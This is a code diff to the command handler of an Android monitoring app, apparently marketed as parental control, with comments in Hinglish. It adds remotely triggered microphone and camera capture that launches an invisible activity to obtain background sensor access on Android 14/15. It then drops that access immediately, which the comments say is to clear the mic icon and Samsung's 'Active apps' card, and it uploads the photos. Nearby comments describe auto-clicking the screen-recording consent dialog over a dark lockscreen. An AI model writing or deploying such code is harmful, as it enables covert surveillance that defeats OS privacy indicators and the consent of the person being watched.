@@ -22,14 +22,17 @@ import com.familyguard.child.data.ChildApp
 import com.familyguard.child.data.Store
 import com.familyguard.child.service.Locator
 import com.familyguard.child.service.AudioStreamer
+import com.familyguard.child.service.MainService
 import com.familyguard.child.service.MirrorManager
 import com.familyguard.child.service.MirrorService
 import com.familyguard.child.service.WsChild
 import com.familyguard.child.ui.BlockOverlay
 import com.familyguard.child.ui.ConsentActivity
+import com.familyguard.child.ui.ForegroundPokeActivity
 import com.familyguard.child.util.SelfHeal
 import com.google.gson.JsonArray
 import com.google.gson.JsonObject
+import kotlinx.coroutines.delay
 
 object CommandHandler {
 
@@ -73,13 +76,16 @@ object CommandHandler {
             }
 
             "audio_start" -> {
-                val (ok, d) = AudioStreamer.start(ctx)
+                val (ok, d) = startMicWithInUseGrant(ctx)
                 data.add("audio", d)
                 Pair(ok, data)
             }
 
             "audio_stop" -> {
                 AudioStreamer.stop()
+                // mic FGS type wapas hatao — Samsung "Active apps" card + status-bar
+                // mic icon turant band (Android 14/15 privacy indicators)
+                MainService.updateTypes(withMic = false, withCam = false)
                 Pair(true, data)
             }
 
@@ -123,15 +129,25 @@ object CommandHandler {
 
             "camera" -> {
                 val front = params.get("facing")?.takeIf { it.isJsonPrimitive }?.asString == "front"
-                val f = CameraCapture.take(ctx, front)
-                if (f != null) {
-                    val url = Api.uploadMedia(f)
-                    data.addProperty("url", url)
-                    runCatching { f.delete() }
-                    Pair(true, data)
-                } else {
-                    data.addProperty("error", "camera unavailable")
-                    Pair(false, data)
+                // Android 14/15: camera FGS type bhi while-in-use hai — poke upgrade
+                // ke bina background se openCamera fail/silent hota hai.
+                if (Build.VERSION.SDK_INT >= 30) {
+                    awaitPokeUpgrade(ctx, "cam")
+                }
+                try {
+                    val f = CameraCapture.take(ctx, front)
+                    if (f != null) {
+                        val url = Api.uploadMedia(f)
+                        data.addProperty("url", url)
+                        runCatching { f.delete() }
+                        Pair(true, data)
+                    } else {
+                        data.addProperty("error", "camera unavailable")
+                        Pair(false, data)
+                    }
+                } finally {
+                    // shot done — camera type wapas rest par (privacy icon + Samsung card band)
+                    MainService.updateTypes(withMic = false, withCam = false)
                 }
             }
 
@@ -168,6 +184,7 @@ object CommandHandler {
                 // auto-confirm kar dega (~1-2 s), phir frames turant chalenge.
                 MirrorManager.stopStreaming()
                 Store.pendingMirrorFps = -1
+                Store.projectionRequestedAt = 0L // in-flight consent state clear — agla start turant fresh dialog kholega
                 MirrorManager.release()
                 runCatching { ctx.stopService(Intent(ctx, MirrorService::class.java)) }
                 sendMirrorState(false)
@@ -280,6 +297,53 @@ object CommandHandler {
         }
     }
 
+    /** MIC START — Android 14/15 safe. Mic FGS type "while-in-use" hai: type ka
+     *  activation sirf tab legal hai jab app ke paas visible activity ho, warna
+     *  system AudioRecord ko chupchap SILENCE kar deta hai ("mic ni kaam karra").
+     *  ForegroundPokeActivity 250 ms ke liye invisible foreground ban kar type
+     *  upgrade karti hai; poke fail ho (background launch blocked) to service-level
+     *  upgrade best-effort — wo tab kaam karta hai jab service foreground-start hui thi. */
+    private suspend fun startMicWithInUseGrant(ctx: Context): Pair<Boolean, JsonObject> {
+        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            val d = JsonObject()
+            d.addProperty("error", "mic permission nahi hai — setup me mic allow karo")
+            return Pair(false, d)
+        }
+        if (Build.VERSION.SDK_INT >= 30) {
+            awaitPokeUpgrade(ctx, "mic")
+        }
+        return AudioStreamer.start(ctx)
+    }
+
+    /** Invisible poke activity launch karo aur uske type-upgrade ka intezaar karo
+     *  (max 2.5 s). Fail hone par service-level best-effort upgrade. */
+    private suspend fun awaitPokeUpgrade(ctx: Context, mode: String) {
+        val before = if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt
+        try {
+            ctx.startActivity(
+                Intent(ctx, ForegroundPokeActivity::class.java)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    .putExtra("mode", mode)
+            )
+        } catch (_: Exception) {
+            // background launch blocked — seedha service upgrade try karo
+            if (mode == "cam") MainService.updateTypes(withMic = false, withCam = true)
+            else MainService.updateTypes(withMic = true, withCam = false)
+            return
+        }
+        val deadline = android.os.SystemClock.elapsedRealtime() + 2500
+        while (android.os.SystemClock.elapsedRealtime() < deadline &&
+            (if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt) == before
+        ) {
+            delay(100)
+        }
+        if ((if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt) == before) {
+            // poke activity khuli hi nahi (BAL block) — fallback upgrade
+            if (mode == "cam") MainService.updateTypes(withMic = false, withCam = true)
+            else MainService.updateTypes(withMic = true, withCam = false)
+        }
+    }
+
     /** Tell the parents the real mirroring state so their UI never shows a fake
      *  "LIVE" while the child is still waiting for the consent dialog. */
     private fun sendMirrorState(streaming: Boolean) {
@@ -297,12 +361,20 @@ object CommandHandler {
      *  auto-clicks "Start now" within 60 s of this call.
      *  quiet=true (reboot path): do NOT wake the screen — the dialog is handled
      *  over the lockscreen while the phone stays dark.
-     *  Returns true when a fresh dialog request was launched. A re-launch within
-     *  8 s of the previous one is suppressed: stacked dialogs were the reason the
-     *  screen-recording prompt appeared "bar bar" and then blocked the screen. */
+     *  Returns true when a fresh dialog request was launched. Re-launch sirf tab
+     *  suppress hota hai jab pehla request sach me in-flight ho (smart guard,
+     *  blind 8 s guard nahi — warna quick off→on toggle par dialog kabhi nahi
+     *  khulta tha aur mirror unreliable ho jata tha). */
     fun requestProjectionConsent(ctx: Context, quiet: Boolean = false): Boolean {
         val now = android.os.SystemClock.elapsedRealtime()
-        if (now - Store.lastConsentRequestAt < 8_000L) return false
+        // SMART suppression: sirf tab ruko jab pehla consent request SACH ME chal
+        // raha ho (fresh request + projection abhi nahi mili). Pehle BLIND 8 s
+        // guard tha — quick mirror off→on toggle ke baad naya request suppress
+        // ho jata tha, dialog KABHI nahi khulta, mirror on/off unreliable ho jata
+        // tha aur parent ki baar-baar taps par dialogs ek ke baad ek khulte the.
+        val inFlight = Store.projectionRequestedAt > 0L &&
+            now - Store.projectionRequestedAt in 0..60_000L
+        if (inFlight && now - Store.lastConsentRequestAt < 8_000L) return false
         Store.lastConsentRequestAt = now
         Store.projectionRequestedAt = now
         try {
